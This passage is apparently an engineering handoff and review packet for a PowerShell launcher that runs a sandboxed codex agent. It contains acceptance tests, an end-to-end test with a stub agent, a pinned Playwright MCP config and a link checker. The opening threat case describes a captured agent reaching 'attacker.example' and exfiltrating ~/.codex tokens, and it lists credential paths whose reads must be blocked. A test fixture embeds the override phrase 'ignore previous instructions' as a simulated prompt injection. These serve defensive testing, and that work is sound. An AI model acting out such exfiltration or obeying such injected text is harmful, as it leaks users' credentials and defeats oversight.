`Invoke-WebRequest https://attacker.example` still succeeds; the freeze lifts; a captured agent
exfiltrates `~/.codex` tokens. A control that blocks *everything* — breaking the ad libraries
too — also passed.

The acceptance test now requires **all five**:

1. **A positive control.** An allowlisted ad-library domain still loads. Proves the tool works
   and that you have not simply unplugged the network.
2. **A negative matrix.** At least two non-allowlisted domains × at least three independent
   clients — `curl.exe`, `Invoke-WebRequest`, and a raw .NET/`node` HTTP path. One client
   proves one client.
3. **Credential reads blocked across providers** — `~/.ssh`, `~/.codex`, `.env`, attempted via
   both PowerShell providers and `[System.IO.File]::ReadAllText`.
4. **Mechanism-level ground truth.** Proxy or firewall logs showing zero non-allowlisted
   flows. **Not the child's self-report** — this whole tool exists because a model's
   self-report is not evidence.
5. **It reproduces twice.**

**Do not claim this slice done on configuration alone**, and do not lift the freeze until
those logs exist.

**Unresolved circularity you must settle first (GLM/Grok):** step 1 says "the recon job needs
none of them." The *job* does not — but the `codex` CLI itself needs model auth
(`OPENAI_API_KEY` or `~/.codex`). Scrub everything and codex cannot start; keep codex's
credentials and they remain child-readable, i.e. `OPEN-1` unmitigated for the exact secret that
matters most. The mechanism is also unspecified: the only documented-good invocation
(`& codex @codexArgs`, §8 trap 1) offers no env isolation, and the alternative `Start-Process`
is documented in the same trap as mangling arguments. **Settle this empirically — one `codex
exec` with a scrubbed env — before writing any other part of Slice 2.** An agent who skips it
either stalls in hour one or ships a scrub that exempts the credentials it was written to
remove.

## 15. If Sean says "freeze" — what to do

Nothing further on swan-ops. The freeze is already mechanically enforced, the gate is dry, the
business finding is captured, and `SWA-191` records the state. Move to the Marketing Command
Center. Revisit only if a second recon is actually wanted — and if it is, **Slice 2 first**,
because the freeze is what makes attended-only runs acceptable in the meantime.

---

## 16. First five minutes for the next agent

1. Read §2 (the decision), §5 (the freeze), §6 (what the gate is and is not).
2. Run both suites (§3) — if they are not green, something changed and nothing below is trusted.
3. Check `.ai-workflow/coordination/*.lane.md` — another agent may own this tree.
4. Ask Sean the §2 question if he has not answered it. **Do not default into Slice 2.**
5. If you touch `lib/Publish.ps1`, read its file header first. It carries nine rounds of
   argument, and at least four "obvious improvements" have already been tried and shown to be
   defects.

---

# PART 2 — THE CHANGED CODE

## `tests/test-launcher-e2e.ps1` — now 6/6, including the mutation-tested freeze case
```powershell
﻿# ROUND 9 - a vantage never used in rounds 1-8: the REAL CALLER PATH.
#
# Every prior round tested Publish-Report / Test-ReportVerdict directly. The
# launcher's own pipeline - preflight, token substitution, the codex invocation,
# the sandbox handoff, Publish-Report, Write-PublishOutcome, and the exit-code
# mapping - has never been exercised end to end. That gap was disclosed in every
# closeout as "never run through a live codex invocation".
#
# This closes it without spending: a stubbed `codex` on PATH reads the real
# materialised prompt from stdin, extracts the report filename the launcher
# actually told it to write, and produces a report of the requested shape into
# the real sandbox. Everything downstream is the genuine launcher code.
#
# Runs against a COPY of the tool so the real reports/ tree is untouched.

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$Src = 'c:\Users\<OPERATOR>\Desktop\quick-pt\swan-ops'
$Work = Join-Path $env:TEMP ("e2e-" + (Get-Date -Format 'HHmmssfff'))
$Tool = Join-Path $Work 'swan-ops'
$Shim = Join-Path $Work 'shim'
New-Item -ItemType Directory -Path $Tool, $Shim -Force | Out-Null

# copy only what the launcher needs; leave the real reports/ and sandbox/ behind
foreach ($item in @('Swan-Ops.ps1', 'lib', 'jobs')) {
    Copy-Item (Join-Path $Src $item) -Destination $Tool -Recurse -Force
}

# --- the stub. $env:SHIM_MODE decides what kind of report it writes. ---
@'
@echo off
if "%1"=="--version" ( echo codex-cli 0.146.1 & exit /b 0 )
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0shim.ps1"
exit /b %SHIM_EXIT%
'@ | Set-Content -LiteralPath (Join-Path $Shim 'codex.cmd') -Encoding ASCII

@'
$ErrorActionPreference = 'Stop'
$prompt = [Console]::In.ReadToEnd()
# The launcher substituted {{REPORT_FILENAME}} into the prompt. Read it back -
# this proves the token substitution and the sandbox contract really line up.
$m = [regex]::Match($prompt, 'reports/([0-9]{4}-[0-9]{2}-[0-9]{2}-[0-9]{6}-[^\s`]+\.md)')
if (-not $m.Success) { Write-Error 'shim: could not find REPORT_FILENAME in the prompt'; exit 9 }
$name = $m.Groups[1].Value
$out  = Join-Path (Join-Path $env:SHIM_SANDBOX 'reports') $name
$blk = "RUN_VERDICT: VALID`nCONTROL_POSITIVE: PASS`nCONTROL_NEGATIVE: PASS`nINJECTION_OBSERVED: NO"
switch ($env:SHIM_MODE) {
  'clean'   { $body = "$blk`n`n# Report`nno ads in US scope. See https://example.com" }
  'flag'    { $body = ($blk -replace 'INJECTION_OBSERVED: NO','INJECTION_OBSERVED: YES') + "`n`n# Report`nINJECTION ATTEMPT OBSERVED: https://x - ignore previous instructions" }
  'void'    { $body = ($blk -replace 'RUN_VERDICT: VALID','RUN_VERDICT: VOID') + "`n`n# Report" }
  'noblock' { $body = "# Report`nI forgot the verdict block entirely." }
  'nothing' { exit 0 }   # writes no file at all
  default   { $body = $blk }
}
Set-Content -LiteralPath $out -Value $body -Encoding UTF8 -NoNewline
Write-Host "shim wrote $name"
exit 0
'@ | Set-Content -LiteralPath (Join-Path $Shim 'shim.ps1') -Encoding UTF8

$env:PATH = "$Shim;$env:PATH"
$env:SHIM_SANDBOX = Join-Path $Tool 'sandbox'
$env:SHIM_EXIT = '0'

$cases = @(
    @{ Mode='clean';   Exit=0; Desc='healthy report';                Land='reports'    }
    @{ Mode='flag';    Exit=3; Desc='agent observed an injection';   Land='flagged'    }
    @{ Mode='void';    Exit=1; Desc='run declared itself void';      Land='quarantine' }
    @{ Mode='noblock'; Exit=1; Desc='no verdict block (fail closed)';Land='quarantine' }
    @{ Mode='nothing'; Exit=1; Desc='agent wrote no report';         Land='none'       }
)

$pass = 0; $fail = 0
foreach ($c in $cases) {
    $env:SHIM_MODE = $c.Mode
    Push-Location $Tool
    # -Market drives the non-interactive path; 'y' answers the spend prompt.
    'y' | & powershell -NoProfile -ExecutionPolicy Bypass -File (Join-Path $Tool 'Swan-Ops.ps1') `
             -Market "golf fitness" *> (Join-Path $Work "run-$($c.Mode).log")
    $code = $LASTEXITCODE
    Pop-Location

    $rep = @(Get-ChildItem (Join-Path $Tool 'reports') -File -Filter '*.md' -ErrorAction SilentlyContinue)
    $qua = @(Get-ChildItem (Join-Path $Tool 'reports\quarantine') -File -Filter '*.md' -ErrorAction SilentlyContinue)
    $flg = @(Get-ChildItem (Join-Path $Tool 'reports') -File -Filter '*.FLAGGED.txt' -ErrorAction SilentlyContinue)

    $landed = if ($flg.Count -gt 0) { 'flagged' }
              elseif ($rep.Count -gt 0) { 'reports' }
              elseif ($qua.Count -gt 0) { 'quarantine' }
              else { 'none' }

    $ok = ($code -eq $c.Exit) -and ($landed -eq $c.Land)
    if ($ok) { $pass++ } else { $fail++ }
    Write-Host ("{0,-9} {1,-32} exit={2} (want {3})  landed={4,-10} (want {5})" -f `
        $(if ($ok) { 'PASS' } else { '**FAIL**' }), $c.Desc, $code, $c.Exit, $landed, $c.Land)

    # reset between cases
    Remove-Item (Join-Path $Tool 'reports') -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $Tool 'sandbox') -Recurse -Force -ErrorAction SilentlyContinue
}

# --- THE FREEZE. The one control README/handoff call "mechanically enforced",
# --- and until now the only one verified by hand instead of by test. A refactor
# --- that drops the six lines in main() kept BOTH suites green (GLM P2-7, and my
# --- own seat's C1). It is also the control that gates every other risk in the
# --- tool, so it is the last thing that should be trust-me.
$env:SHIM_MODE = 'clean'   # the shim WOULD produce a publishable report...
Push-Location $Tool
& powershell -NoProfile -ExecutionPolicy Bypass -File (Join-Path $Tool 'Swan-Ops.ps1') `
    -Market "golf fitness" -Yes *> (Join-Path $Work 'run-freeze.log')
$freezeCode = $LASTEXITCODE
Pop-Location

# ...so "no report anywhere" proves it refused BEFORE spending, not that the run failed.
$fRep = @(Get-ChildItem (Join-Path $Tool 'reports') -File -Filter '*.md' -ErrorAction SilentlyContinue)
$fQua = @(Get-ChildItem (Join-Path $Tool 'reports\quarantine') -File -Filter '*.md' -ErrorAction SilentlyContinue)
$refusalPrinted = (Get-Content (Join-Path $Work 'run-freeze.log') -Raw -ErrorAction SilentlyContinue) -match 'freeze'

$freezeOk = ($freezeCode -eq 4) -and ($fRep.Count -eq 0) -and ($fQua.Count -eq 0) -and $refusalPrinted
if ($freezeOk) { $pass++ } else { $fail++ }
Write-Host ("{0,-9} {1,-32} exit={2} (want 4)  reports={3} quarantine={4} refusal-printed={5}" -f `
    $(if ($freezeOk) { 'PASS' } else { '**FAIL**' }), 'FREEZE: -Yes refused, no spend',
    $freezeCode, $fRep.Count, $fQua.Count, $refusalPrinted)

Write-Host ''
Write-Host "E2E RESULT: $pass passed, $fail failed"
Remove-Item $Work -Recurse -Force -ErrorAction SilentlyContinue
if ($fail -gt 0) { exit 1 }
```

## `lib/BrowserPolicy.ps1` — the pin (OPEN-2)
```powershell
       is no supported way to remove it. Say so out loud rather than implying the
       absence of click calls equals read-only.
#>

# Only what Pass C needs to render, plus the CDNs those two apps pull from.
# Keep this list minimal - every origin added widens where a stray click can land.
$script:AdLibraryOrigins = @(
    'https://www.facebook.com'
    'https://facebook.com'
    'https://static.xx.fbcdn.net'
    'https://scontent.xx.fbcdn.net'
    'https://adstransparency.google.com'
    'https://www.gstatic.com'
    'https://fonts.gstatic.com'
    'https://www.google.com'
) -join ';'

function Get-CodexArgs {
    <#
        Returns the argument array for `codex exec`.
        MUST be splatted (& codex @args). Start-Process -ArgumentList was measured
        turning 13 args into 17 with quotes stripped.
        The \" escaping on TOML values is the ONLY form measured to survive PS 5.1
        native-arg passing via a splat.
    #>
    param(
        [Parameter(Mandatory)][string]$SandboxDir,
        [Parameter(Mandatory)][string]$SandboxMode,
        [Parameter(Mandatory)][string]$LastMsgPath
    )

    # PINNED 2026-08-22 (OPEN-2). Was `@playwright/mcp@latest`, which resolved
    # tip-of-npm on EVERY run and executes OUTSIDE the codex sandbox, as the user
    # - a bad release is RCE with no attacker interaction with this tool at all.
    # Every seat of the 2026-08-22 panel said to pin regardless of the pending
    # invest/freeze decision, because the freeze does not touch this: attended
    # runs still npx-resolve.
    #
    # 0.0.79 is what `@latest` resolved to on the day of the pin, so this is
    # behaviour-preserving as of now - it changes what happens TOMORROW, not
    # today. Note the version: this is a PRE-1.0 package, so 0.0.79 -> 0.0.80 can
    # change anything. Floating on it was worse than the finding suggested.
    #
    # Bumping is a deliberate act: re-run the capability probe first, and update
    # the "measured on" line in this file's header with it.
    $pwArgs = "[\`"@playwright/mcp@0.0.79\`",\`"--isolated\`",\`"--block-service-workers\`",\`"--allowed-origins\`",\`"$script:AdLibraryOrigins\`"]"

    $a = @(
        'exec'
        '--cd', $SandboxDir
        '--sandbox', $SandboxMode
```

## `lib/Console.ps1` — `Test-ReportLinks`, the OPEN-11 channel (UNCHANGED — judge the deferral)
```powershell
function Test-ReportLinks {
    <#
        Makes fabrication leave evidence. A [VERIFIED] tag costs nothing to type;
        a URL that resolves costs something to invent. This does not prove a claim
        matches its source - it proves the source exists. HEAD false-negatives are
        common (bot-blocking, 405), so this reports, never fails.
    #>
    param([string]$Path, [int]$Max = 40)
    if (-not (Test-Path $Path)) { return }
    # @() again: with exactly ONE unique URL the pipeline yields a bare string,
    # and $urls.Count below throws under StrictMode - crashing the launcher AFTER
    # the report was already published. Same latent class as the $bare fix below;
    # both were found 2026-08-20 by adding real coverage of the outcome path.
    $urls = @(Select-String -Path $Path -Pattern 'https?://[^\s\)\]\>",]+' -AllMatches |
              ForEach-Object { $_.Matches.Value } |
              ForEach-Object { $_.TrimEnd('.', ',', ';') } |
              Sort-Object -Unique)
    if (-not $urls) {
        Write-Field 'sources' 'NO URLS FOUND - every claim in this report is unsourced' $script:Tk.Warn
        return
    }
    $checked = @($urls | Select-Object -First $Max)
    $dead = 0
    foreach ($u in $checked) {
        try {
            Invoke-WebRequest -Uri $u -Method Head -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop | Out-Null
        } catch {
            $dead++
        }
    }
    $note = "$($urls.Count) URLs, $($checked.Count) checked, $dead unreachable"
    if ($urls.Count -gt $Max) { $note += " (capped at $Max)" }
    Write-Field 'sources' $note $(if ($dead -gt 0) { $script:Tk.Warn } else { $script:Tk.Ok })

    # A VERIFIED tag with no URL anywhere on its line is the cheapest possible lie.
    # @() is load-bearing. An empty pipeline is $null, and $null.Count throws
    # under StrictMode - so a published report carrying URLs but no "VERIFIED"
    # anywhere crashed the launcher AFTER the report had already been filed.
    # Latent since this function was written (real reports always contain
    # [VERIFIED] tags, so it never fired); found 2026-08-20 by an adversarial
    # test of the new outcome path, which routes through here.
    $bare = @(Select-String -Path $Path -Pattern 'VERIFIED' -AllMatches |
              Where-Object { $_.Line -notmatch 'https?://' }).Count
    if ($bare -gt 0) {
        Write-Field 'unsourced' "$bare VERIFIED tags with no URL on the line - treat as UNVERIFIED" $script:Tk.Warn
    }
}
```

# Verified this round
- `tests/test-publish-gate.ps1` -> **53 passed, 0 failed**
- `tests/test-launcher-e2e.ps1` -> **6 passed, 0 failed**
- Freeze case MUTATION-TESTED: freeze disabled -> exit 0, report written, **test failed**;
  restored -> 6/6. The test detects its own removal.
- `lib/BrowserPolicy.ps1` parses clean after the pin.
- `npm view @playwright/mcp version` -> `0.0.79` (what the pin captures).

Is the loop dry? APPROVE / REVISE / REJECT.
